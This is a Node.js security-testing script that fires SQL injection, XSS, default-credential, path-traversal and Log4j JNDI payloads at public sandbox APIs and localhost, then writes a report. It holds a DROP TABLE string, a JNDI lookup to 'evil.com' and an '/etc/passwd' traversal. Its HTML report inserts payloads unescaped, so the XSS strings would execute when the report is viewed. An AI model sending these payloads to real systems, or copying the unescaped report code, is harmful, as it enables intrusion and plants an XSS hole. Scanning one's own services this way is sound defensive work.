const axios = require('axios');
const fs = require('fs');
const path = require('path');

// Configuration
const config = {
  targetApis: {
    jsonplaceholder: 'https://jsonplaceholder.typicode.com',
    reqres: 'https://reqres.in/api',
    postmanEcho: 'https://postman-echo.com',
    localApi: 'http://localhost:3000/api'
  },
  timeout: 10000,
  maxRetries: 3,
  outputDir: './reports'
};

// Security test results
let securityResults = {
  timestamp: new Date().toISOString(),
  summary: {
    totalTests: 0,
    passed: 0,
    failed: 0,
    warnings: 0
  },
  tests: []
};

// Common SQL injection payloads
const sqlInjectionPayloads = [
  "' OR '1'='1",
  "' OR 1=1--",
  "'; DROP TABLE users;--",
  "' UNION SELECT * FROM users--",
  "admin'--",
  "1' OR '1'='1' /*",
  "' OR 'a'='a",
  "1'; EXEC sp_configure 'show advanced options', 1--"
];

// XSS payloads
const xssPayloads = [
  "<script>alert('XSS')</script>",
  "javascript:alert('XSS')",
  "<img src=x onerror=alert('XSS')>",
  "'\"><script>alert('XSS')</script>",
  "<svg onload=alert('XSS')>",
  "<iframe src=javascript:alert('XSS')>",
  "<body onload=alert('XSS')>",
  "eval('alert(\"XSS\")')"
];

// Authentication bypass attempts
const authBypassPayloads = [
  { username: "admin", password: "admin" },
  { username: "administrator", password: "password" },
  { username: "admin", password: "" },
  { username: "", password: "" },
  { username: "guest", password: "guest" },
  { username: "test", password: "test" },
  { username: "root", password: "root" },
  { username: "admin", password: "123456" }
];

// Rate limiting test configuration
const rateLimitConfig = {
  requests: 100,
  timeWindow: 60000, // 1 minute
  burstRequests: 50,
  burstWindow: 5000 // 5 seconds
};

class SecurityTester {
  constructor() {
    this.results = [];
    this.setupAxios();
  }

  setupAxios() {
    // Set default timeout
    axios.defaults.timeout = config.timeout;
    
    // Add response interceptor to capture security headers
    axios.interceptors.response.use(
      (response) => {
        response.securityHeaders = this.analyzeSecurityHeaders(response.headers);
        return response;
      },
      (error) => {
        if (error.response) {
          error.response.securityHeaders = this.analyzeSecurityHeaders(error.response.headers);
        }
        return Promise.reject(error);
      }
    );
  }

  analyzeSecurityHeaders(headers) {
    const securityHeaders = {
      'content-security-policy': headers['content-security-policy'] || null,
      'x-frame-options': headers['x-frame-options'] || null,
      'x-content-type-options': headers['x-content-type-options'] || null,
      'x-xss-protection': headers['x-xss-protection'] || null,
      'strict-transport-security': headers['strict-transport-security'] || null,
      'referrer-policy': headers['referrer-policy'] || null,
      'permissions-policy': headers['permissions-policy'] || null
    };

    return securityHeaders;
  }

  async runAllTests() {
    console.log('🔒 Starting comprehensive security tests...\n');

    // Test each API
    for (const [apiName, baseUrl] of Object.entries(config.targetApis)) {
      console.log(`Testing ${apiName.toUpperCase()} API...`);
      
      if (apiName === 'localApi' && !await this.checkApiAvailability(baseUrl)) {
        console.log(`Skipping ${apiName} - API not available\n`);
        continue;
      }

      await this.testSQLInjection(apiName, baseUrl);
      await this.testXSSVulnerabilities(apiName, baseUrl);
      await this.testAuthenticationBypass(apiName, baseUrl);
      await this.testRateLimiting(apiName, baseUrl);
      await this.testSecurityHeaders(apiName, baseUrl);
      await this.testHttpMethods(apiName, baseUrl);
      await this.testInputValidation(apiName, baseUrl);
      
      console.log(`Completed testing ${apiName}\n`);
    }

    // Generate and save report
    await this.generateReport();
    console.log('🔒 Security testing completed!');
  }

  async checkApiAvailability(baseUrl) {
    try {
      await axios.get(baseUrl, { timeout: 5000 });
      return true;
    } catch (error) {
      return false;
    }
  }

  async testSQLInjection(apiName, baseUrl) {
    console.log('  Testing SQL Injection vulnerabilities...');
    
    const testCases = [
      { endpoint: '/posts', method: 'GET', param: 'userId' },
      { endpoint: '/users', method: 'GET', param: 'id' },
      { endpoint: '/comments', method: 'GET', param: 'postId' }
    ];

    for (const testCase of testCases) {
      for (const payload of sqlInjectionPayloads) {
        try {
          const url = `${baseUrl}${testCase.endpoint}?${testCase.param}=${encodeURIComponent(payload)}`;
          const startTime = Date.now();
          const response = await axios.get(url);
          const responseTime = Date.now() - startTime;

          const result = {
            test: 'SQL Injection',
            api: apiName,
            endpoint: testCase.endpoint,
            payload: payload,
            status: response.status,
            responseTime: responseTime,
            vulnerable: this.detectSQLInjection(response.data, responseTime),
            severity: 'HIGH',
            timestamp: new Date().toISOString()
          };

          this.addTestResult(result);

        } catch (error) {
          // Error responses might indicate successful injection
          const result = {
            test: 'SQL Injection',
            api: apiName,
            endpoint: testCase.endpoint,
            payload: payload,
            status: error.response ? error.response.status : 'ERROR',
            vulnerable: error.response && error.response.status === 500,
            severity: 'HIGH',
            error: error.message,
            timestamp: new Date().toISOString()
          };

          this.addTestResult(result);
        }
      }
    }
  }

  detectSQLInjection(responseData, responseTime) {
    // Check for SQL error messages
    const sqlErrors = [
      'sql syntax',
      'mysql_fetch',
      'ora-01756',
      'microsoft ole db',
      'odbc drivers error',
      'sqlite_exception',
      'postgresql'
    ];

    const dataString = JSON.stringify(responseData).toLowerCase();
    const hasErrors = sqlErrors.some(error => dataString.includes(error));
    
    // Unusual response time might indicate database queries
    const suspiciousResponseTime = responseTime > 5000;
    
    return hasErrors || suspiciousResponseTime;
  }

  async testXSSVulnerabilities(apiName, baseUrl) {
    console.log('  Testing XSS vulnerabilities...');

    const testEndpoints = [
      { endpoint: '/posts', method: 'POST', fields: ['title', 'body'] },
      { endpoint: '/users', method: 'POST', fields: ['name', 'job'] }
    ];

    for (const test of testEndpoints) {
      for (const payload of xssPayloads) {
        try {
          const data = {};
          test.fields.forEach(field => {
            data[field] = payload;
          });

          const response = await axios.post(`${baseUrl}${test.endpoint}`, data, {
            headers: { 'Content-Type': 'application/json' }
          });

          const result = {
            test: 'XSS Vulnerability',
            api: apiName,
            endpoint: test.endpoint,
            payload: payload,
            status: response.status,
            vulnerable: this.detectXSSReflection(response.data, payload),
            severity: 'MEDIUM',
            timestamp: new Date().toISOString()
          };

          this.addTestResult(result);

        } catch (error) {
          // Log error but continue testing
          console.log(`    XSS test error for ${apiName}: ${error.message}`);
        }
      }
    }
  }

  detectXSSReflection(responseData, payload) {
    const responseString = JSON.stringify(responseData);
    return responseString.includes(payload) && payload.includes('<script>');
  }

  async testAuthenticationBypass(apiName, baseUrl) {
    console.log('  Testing authentication bypass...');

    if (apiName !== 'reqres') {
      console.log('    Skipping - No authentication endpoints');
      return;
    }

    for (const credentials of authBypassPayloads) {
      try {
        const response = await axios.post(`${baseUrl}/login`, credentials, {
          headers: { 'Content-Type': 'application/json' }
        });

        const result = {
          test: 'Authentication Bypass',
          api: apiName,
          endpoint: '/login',
          credentials: credentials,
          status: response.status,
          vulnerable: response.status === 200 && response.data.token,
          severity: 'CRITICAL',
          timestamp: new Date().toISOString()
        };

        this.addTestResult(result);

      } catch (error) {
        // Expected behavior for invalid credentials
        const result = {
          test: 'Authentication Bypass',
          api: apiName,
          endpoint: '/login',
          credentials: credentials,
          status: error.response ? error.response.status : 'ERROR',
          vulnerable: false,
          severity: 'CRITICAL',
          timestamp: new Date().toISOString()
        };

        this.addTestResult(result);
      }
    }
  }

  async testRateLimiting(apiName, baseUrl) {
    console.log('  Testing rate limiting...');

    const endpoint = '/posts';
    const requests = [];
    const startTime = Date.now();

    // Burst test - many requests in short time
    for (let i = 0; i < rateLimitConfig.burstRequests; i++) {
      requests.push(
        axios.get(`${baseUrl}${endpoint}`)
          .then(response => ({ success: true, status: response.status, index: i }))
          .catch(error => ({ 
            success: false, 
            status: error.response ? error.response.status : 'ERROR',
            index: i 
          }))
      );
    }

    const results = await Promise.all(requests);
    const endTime = Date.now();
    const duration = endTime - startTime;

    const successCount = results.filter(r => r.success).length;
    const errorCount = results.filter(r => !r.success).length;
    const rateLimited = results.some(r => r.status === 429);

    const result = {
      test: 'Rate Limiting',
      api: apiName,
      endpoint: endpoint,
      requestCount: rateLimitConfig.burstRequests,
      successCount: successCount,
      errorCount: errorCount,
      duration: duration,
      rateLimited: rateLimited,
      vulnerable: !rateLimited && successCount === rateLimitConfig.burstRequests,
      severity: 'MEDIUM',
      timestamp: new Date().toISOString()
    };

    this.addTestResult(result);
  }

  async testSecurityHeaders(apiName, baseUrl) {
    console.log('  Testing security headers...');

    try {
      const response = await axios.get(baseUrl);
      const headers = response.securityHeaders;

      const missingHeaders = [];
      const weakHeaders = [];

      // Check for critical security headers
      if (!headers['x-frame-options']) {
        missingHeaders.push('X-Frame-Options');
      }
      if (!headers['x-content-type-options']) {
        missingHeaders.push('X-Content-Type-Options');
      }
      if (!headers['content-security-policy']) {
        missingHeaders.push('Content-Security-Policy');
      }
      if (!headers['strict-transport-security']) {
        missingHeaders.push('Strict-Transport-Security');
      }

      // Check for weak configurations
      if (headers['x-xss-protection'] === '0') {
        weakHeaders.push('X-XSS-Protection disabled');
      }

      const result = {
        test: 'Security Headers',
        api: apiName,
        endpoint: '/',
        headers: headers,
        missingHeaders: missingHeaders,
        weakHeaders: weakHeaders,
        vulnerable: missingHeaders.length > 0 || weakHeaders.length > 0,
        severity: missingHeaders.length > 2 ? 'HIGH' : 'LOW',
        timestamp: new Date().toISOString()
      };

      this.addTestResult(result);

    } catch (error) {
      console.log(`    Security headers test error for ${apiName}: ${error.message}`);
    }
  }

  async testHttpMethods(apiName, baseUrl) {
    console.log('  Testing HTTP method security...');

    const methods = ['OPTIONS', 'TRACE', 'TRACK', 'CONNECT', 'PATCH', 'HEAD'];
    const endpoint = '/posts';

    for (const method of methods) {
      try {
        const response = await axios.request({
          method: method,
          url: `${baseUrl}${endpoint}`
        });

        const result = {
          test: 'HTTP Method Security',
          api: apiName,
          endpoint: endpoint,
          method: method,
          status: response.status,
          allowed: response.status !== 405,
          vulnerable: method === 'TRACE' && response.status === 200,
          severity: method === 'TRACE' ? 'MEDIUM' : 'LOW',
          timestamp: new Date().toISOString()
        };

        this.addTestResult(result);

      } catch (error) {
        const result = {
          test: 'HTTP Method Security',
          api: apiName,
          endpoint: endpoint,
          method: method,
          status: error.response ? error.response.status : 'ERROR',
          allowed: false,
          vulnerable: false,
          severity: 'LOW',
          timestamp: new Date().toISOString()
        };

        this.addTestResult(result);
      }
    }
  }

  async testInputValidation(apiName, baseUrl) {
    console.log('  Testing input validation...');

    const maliciousInputs = [
      '{"test": "value"}',  // JSON injection
      'null',
      'undefined',
      '[]',
      '{}',
      '<xml>test</xml>',
      '${jndi:ldap://evil.com/a}',  // Log4j
      '../../../etc/passwd',        // Path traversal
      'A'.repeat(10000),           // Buffer overflow attempt
      '\x00\x01\x02\x03'          // Binary data
    ];

    const testEndpoints = [
      { endpoint: '/posts', method: 'POST', field: 'title' },
      { endpoint: '/users', method: 'POST', field: 'name' }
    ];

    for (const test of testEndpoints) {
      for (const input of maliciousInputs) {
        try {
          const data = { [test.field]: input };
          
          const response = await axios.post(`${baseUrl}${test.endpoint}`, data, {
            headers: { 'Content-Type': 'application/json' }
          });

          const result = {
            test: 'Input Validation',
            api: apiName,
            endpoint: test.endpoint,
            input: input.substring(0, 100), // Truncate for readability
            status: response.status,
            accepted: response.status >= 200 && response.status < 300,
            vulnerable: this.detectInputValidationIssues(response.data, input),
            severity: 'MEDIUM',
            timestamp: new Date().toISOString()
          };

          this.addTestResult(result);

        } catch (error) {
          // Errors might indicate proper input validation
          const result = {
            test: 'Input Validation',
            api: apiName,
            endpoint: test.endpoint,
            input: input.substring(0, 100),
            status: error.response ? error.response.status : 'ERROR',
            accepted: false,
            vulnerable: false,
            severity: 'MEDIUM',
            timestamp: new Date().toISOString()
          };

          this.addTestResult(result);
        }
      }
    }
  }

  detectInputValidationIssues(responseData, input) {
    const responseString = JSON.stringify(responseData);
    
    // Check if malicious input is reflected without encoding
    if (input.includes('<') && responseString.includes(input)) {
      return true;
    }
    
    // Check for error messages that reveal system information
    const sensitiveErrors = [
      'stack trace',
      'file not found',
      'access denied',
      'internal server error'
    ];
    
    return sensitiveErrors.some(error => 
      responseString.toLowerCase().includes(error)
    );
  }

  addTestResult(result) {
    securityResults.tests.push(result);
    securityResults.summary.totalTests++;
    
    if (result.vulnerable) {
      securityResults.summary.failed++;
      console.log(`    ❌ VULNERABILITY: ${result.test} - ${result.severity}`);
    } else {
      securityResults.summary.passed++;
      console.log(`    ✅ SECURE: ${result.test}`);
    }
  }

  async generateReport() {
    // Create reports directory if it doesn't exist
    if (!fs.existsSync(config.outputDir)) {
      fs.mkdirSync(config.outputDir, { recursive: true });
    }

    // Generate JSON report
    const jsonReportPath = path.join(config.outputDir, 'security-test-report.json');
    fs.writeFileSync(jsonReportPath, JSON.stringify(securityResults, null, 2));

    // Generate HTML report
    const htmlReportPath = path.join(config.outputDir, 'security-test-report.html');
    const htmlReport = this.generateHTMLReport();
    fs.writeFileSync(htmlReportPath, htmlReport);

    console.log(`\n📊 Reports generated:`);
    console.log(`   JSON: ${jsonReportPath}`);
    console.log(`   HTML: ${htmlReportPath}`);
    
    this.printSummary();
  }

  printSummary() {
    console.log(`\n🔒 Security Test Summary:`);
    console.log(`   Total Tests: ${securityResults.summary.totalTests}`);
    console.log(`   Passed: ${securityResults.summary.passed}`);
    console.log(`   Failed: ${securityResults.summary.failed}`);
    console.log(`   Security Score: ${((securityResults.summary.passed / securityResults.summary.totalTests) * 100).toFixed(1)}%`);
  }

  generateHTMLReport() {
    const vulnerabilityCount = {
      CRITICAL: securityResults.tests.filter(t => t.vulnerable && t.severity === 'CRITICAL').length,
      HIGH: securityResults.tests.filter(t => t.vulnerable && t.severity === 'HIGH').length,
      MEDIUM: securityResults.tests.filter(t => t.vulnerable && t.severity === 'MEDIUM').length,
      LOW: securityResults.tests.filter(t => t.vulnerable && t.severity === 'LOW').length
    };

    return `
<!DOCTYPE html>
<html>
<head>
    <title>Security Test Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { text-align: center; border-bottom: 3px solid #d32f2f; padding-bottom: 20px; margin-bottom: 30px; }
        .header h1 { color: #d32f2f; margin: 0; }
        .summary { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .summary-card { padding: 20px; border-radius: 8px; text-align: center; color: white; }
        .summary-card h3 { margin: 0 0 10px 0; }
        .summary-card p { margin: 0; font-size: 24px; font-weight: bold; }
        .critical { background: #d32f2f; }
        .high { background: #f57c00; }
        .medium { background: #fbc02d; }
        .low { background: #388e3c; }
        .passed { background: #4caf50; }
        .failed { background: #f44336; }
        .test-result { margin: 15px 0; padding: 15px; border-radius: 5px; border-left: 5px solid; }
        .test-result.vulnerable { border-left-color: #f44336; background-color: #ffebee; }
        .test-result.secure { border-left-color: #4caf50; background-color: #e8f5e8; }
        .severity { display: inline-block; padding: 4px 8px; border-radius: 4px; color: white; font-size: 12px; font-weight: bold; }
        .severity.CRITICAL { background: #d32f2f; }
        .severity.HIGH { background: #f57c00; }
        .severity.MEDIUM { background: #fbc02d; }
        .severity.LOW { background: #388e3c; }
        .details { margin-top: 10px; font-size: 14px; color: #666; }
        .api-section { margin: 30px 0; padding: 20px; background: #f8f9fa; border-radius: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 Security Test Report</h1>
            <p>Generated on: ${securityResults.timestamp}</p>
        </div>
        
        <div class="summary">
            <div class="summary-card critical">
                <h3>Critical</h3>
                <p>${vulnerabilityCount.CRITICAL}</p>
            </div>
            <div class="summary-card high">
                <h3>High</h3>
                <p>${vulnerabilityCount.HIGH}</p>
            </div>
            <div class="summary-card medium">
                <h3>Medium</h3>
                <p>${vulnerabilityCount.MEDIUM}</p>
            </div>
            <div class="summary-card low">
                <h3>Low</h3>
                <p>${vulnerabilityCount.LOW}</p>
            </div>
            <div class="summary-card passed">
                <h3>Passed</h3>
                <p>${securityResults.summary.passed}</p>
            </div>
            <div class="summary-card failed">
                <h3>Failed</h3>
                <p>${securityResults.summary.failed}</p>
            </div>
        </div>
        
        <h2>Test Results by API</h2>
        ${this.generateAPIResults()}
        
        <h2>All Test Results</h2>
        ${securityResults.tests.map(test => `
            <div class="test-result ${test.vulnerable ? 'vulnerable' : 'secure'}">
                <h4>${test.test} - ${test.api.toUpperCase()}${test.endpoint || ''}</h4>
                <span class="severity ${test.severity}">${test.severity}</span>
                <div class="details">
                    ${test.payload ? `<strong>Payload:</strong> ${test.payload}<br>` : ''}
                    ${test.status ? `<strong>Status:</strong> ${test.status}<br>` : ''}
                    ${test.vulnerable ? '<strong>Result:</strong> ❌ VULNERABLE' : '<strong>Result:</strong> ✅ SECURE'}
                </div>
            </div>
        `).join('')}
    </div>
</body>
</html>`;
  }

  generateAPIResults() {
    const apis = [...new Set(securityResults.tests.map(t => t.api))];
    
    return apis.map(api => {
      const apiTests = securityResults.tests.filter(t => t.api === api);
      const vulnerableTests = apiTests.filter(t => t.vulnerable);
      const secureTests = apiTests.filter(t => !t.vulnerable);
      
      return `
        <div class="api-section">
            <h3>${api.toUpperCase()} API</h3>
            <p>Total Tests: ${apiTests.length} | Vulnerable: ${vulnerableTests.length} | Secure: ${secureTests.length}</p>
            <p>Security Score: ${((secureTests.length / apiTests.length) * 100).toFixed(1)}%</p>
        </div>
      `;
    }).join('');
  }
}

// Run security tests if this file is executed directly
if (require.main === module) {
  const tester = new SecurityTester();
  tester.runAllTests().catch(console.error);
}

module.exports = SecurityTester;